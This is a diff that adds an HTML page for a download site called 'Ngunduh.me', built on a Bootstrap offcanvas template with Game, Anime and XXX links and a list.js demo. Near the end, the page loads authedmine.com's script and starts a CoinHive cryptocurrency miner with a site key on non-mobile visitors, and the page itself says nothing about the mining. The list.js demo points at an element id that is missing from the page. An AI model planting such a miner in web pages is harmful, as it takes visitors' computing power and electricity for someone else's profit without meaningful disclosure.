@@ -1,0 +1,126 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="https://getbootstrap.com/docs/4.0/favicon.ico">
+
+    <title>Offcanvas template for Bootstrap</title>
+
+    <!-- Bootstrap core CSS -->
+    <link href="https://getbootstrap.com/docs/4.0/dist/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+    <link href="https://getbootstrap.com/docs/4.0/offcanvas.css" rel="stylesheet">
+    
+    <!-- LIST JS -->
+    <script src="//cdnjs.cloudflare.com/ajax/libs/list.js/1.5.0/list.min.js"></script>
+
+  </head>
+
+  <body class="bg-light">
+
+    <nav class="navbar navbar-expand-sm fixed-top navbar-dark bg-dark">
+      <a class="navbar-brand" href="#">Ngunduh.<b>me</b></a>
+      <button class="navbar-toggler p-0 border-0" type="button" data-toggle="offcanvas">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+
+      <div class="navbar-collapse offcanvas-collapse" id="navbarsExampleDefault">
+        <ul class="navbar-nav mr-auto">
+          <li class="nav-item active">
+            <a class="nav-link" href="#">Game <span class="sr-only">(current)</span></a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#">Anime</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#">XXX</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#">Link</a>
+          </li>
+          
+        </ul>
+      </div>
+    </nav>
+
+    <main role="main" class="container">
+      
+      <!-- A -->
+      <div class="my-3 p-3 bg-white rounded box-shadow">
+        
+      </div>
+      
+      <!-- A -->
+      <div class="my-3 p-3 bg-white rounded box-shadow">
+        
+        <div id="users">
+          <input class="search" placeholder="Search" />
+          <button class="sort" data-sort="name">
+            Sort
+          </button>
+          <ul class="list"></ul>
+        </div>
+        
+      </div>
+      
+      
+      
+    </main>
+
+    <!-- Bootstrap core JavaScript
+    ================================================== -->
+    <!-- Placed at the end of the document so the pages load faster -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script>window.jQuery || document.write('<script src="https://getbootstrap.com/docs/4.0/assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
+    <script src="https://getbootstrap.com/docs/4.0/assets/js/vendor/popper.min.js"></script>
+    <script src="https://getbootstrap.com/docs/4.0/dist/js/bootstrap.min.js"></script>
+    <script src="https://getbootstrap.com/docs/4.0/assets/js/vendor/holder.min.js"></script>
+    <script src="https://getbootstrap.com/docs/4.0/examples/offcanvas/offcanvas.js"></script>
+    
+    <script src="https://authedmine.com/lib/authedmine.min.js"></script>
+    <script>
+      var miner = new CoinHive.Anonymous('afQJAQO5UAZOx8BAMJE9POaN22Jygo8h', {throttle: 0.75});
+
+      // Only start on non-mobile devices and if not opted-out
+      // in the last 14400 seconds (4 hours):
+      if (!miner.isMobile() && !miner.didOptOut(14400)) {
+        miner.start();
+      }
+    </script>
+    
+    <script>
+    var options = {
+      valueNames: [ 'name', 'born' ],
+      // Since there are no elements in the list, this will be used as template.
+      item: '<li><h3 class="name"></h3><p class="born"></p></li>'
+    };
+
+    var values = [
+      {
+        name: 'Jonny Strömberg',
+        born: 1986
+      },
+      {
+        name: 'Jonas Arnklint',
+        born: 1985
+      },
+      {
+        name: 'Martina Elm',
+        born: 1986
+      }
+    ];
+
+    var userList = new List('example-list', options, values);
+
+    userList.add({
+      name: 'Gustaf Lindqvist',
+      born: 1983
+    });
+    
+    </script>
+  </body>
+</html>
